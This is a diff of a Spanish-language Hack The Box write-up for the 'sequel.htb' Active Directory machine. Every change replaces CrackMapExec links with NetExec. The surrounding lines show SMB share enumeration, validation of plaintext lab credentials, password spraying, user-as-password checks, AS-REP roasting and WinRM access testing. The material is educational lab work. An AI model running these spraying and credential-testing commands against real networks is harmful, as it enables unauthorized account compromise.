@@ -24,7 +24,7 @@ nmap -p53,88,135,139,389,445,464,636,1433,3268,5985,9389,47001,49664,49665,49666
 
 ## Enumeración del SMB
 
-Con [[CRACKMAPEXEC]] enumeraremos el dominio para sacar el nombre de este y poder añadrilo al `/etc/hosts`
+Con [[NETEXEC]] enumeraremos el dominio para sacar el nombre de este y poder añadrilo al `/etc/hosts`
 ```shell
 nxc smb 10.129.232.128
 ```
@@ -32,7 +32,7 @@ nxc smb 10.129.232.128
 Añadimos al `/etc/hosts` la IP y el dominio `10.129.232.128  sequel.htb dc01 dc01.sequel.htb`
 
 ### Verificamos si el usuario es valido
-Con el usuario que nos han proporcionado validamos si este es valido usando [[CRACKMAPEXEC]]
+Con el usuario que nos han proporcionado validamos si este es valido usando [[NETEXEC]]
 ```shell
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
 ```
@@ -52,7 +52,7 @@ kerbrute userenum --dc 10.129.232.128 -d sequel.htb users.txt
 ```
 
 ### Enumeramos los recursos compartidos en red
-Con [[CRACKMAPEXEC]] enumeramos los recursos compartidos a los que el usuario `rose` tiene acceso
+Con [[NETEXEC]] enumeramos los recursos compartidos a los que el usuario `rose` tiene acceso
 ```shell
 nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
 ```
@@ -95,7 +95,7 @@ Observamos que es un archivo comprimido así que lo descomprimimos para ver el c
 
 Y en el directorio `xl/sharedStrings.xml` al ver el archivo con un `cat` podremos ver el contenido del Excel, de ahí obtenemos una lista de usuarios y contraseñas, verificamos cuales son validas
 
-Usando [[CRACKMAPEXEC]] y nuestra lista de usuarios creada buscamos usuarios
+Usando [[NETEXEC]] y nuestra lista de usuarios creada buscamos usuarios
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p passwords.txt
 ```
@@ -105,12 +105,12 @@ Descubrimos el usuario
 oscar::86LxLBMgEWaKUnBG
 ```
 
-Verificamos que el usuario es valido usando [[CRACKMAPEXEC]]
+Verificamos que el usuario es valido usando [[NETEXEC]]
 ```shell
 nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
 ```
 
-Verificamos con [[CRACKMAPEXEC]] los recursos compartidos a los que tiene acceso el usuario
+Verificamos con [[NETEXEC]] los recursos compartidos a los que tiene acceso el usuario
 ```shell
 nxc smb 10.129.232.128 -u 'oscar' -p '86LxLBMgEWaKUnBG'
 ```
@@ -170,7 +170,7 @@ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
 
 ## Password spraying
 
-Con [[CRACKMAPEXEC]] hacemos password spraying para ver si una contraseña vale para otro usuario
+Con [[NETEXEC]] hacemos password spraying para ver si una contraseña vale para otro usuario
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
 ```
@@ -178,7 +178,7 @@ nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su'
 
 ## User as Password
 
-Con [[CRACKMAPEXEC]] probaremos a usar una lista de contraseñas y usuarios para ver si alguno corresponde entre ellos
+Con [[NETEXEC]] probaremos a usar una lista de contraseñas y usuarios para ver si alguno corresponde entre ellos
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p users.txt --no-bruteforce
 ```
@@ -256,7 +256,7 @@ type sql-Configuration.INI
 ```
 
 Encontramos una contraseña `WqSZAF6CysDQbGb3` la guardamos en nuestro fichero de contraseñas
-Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece usando [[CRACKMAPEXEC]]
+Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece usando [[NETEXEC]]
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
 ```
@@ -268,7 +268,7 @@ ryan::WqSZAF6CysDQbGb3
 
 ### Shell ryan
 
-Vamos a validar si el usuario pertenece a `Remote Management` con [[CRACKMAPEXEC]]
+Vamos a validar si el usuario pertenece a `Remote Management` con [[NETEXEC]]
 ```shell
 nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 ```
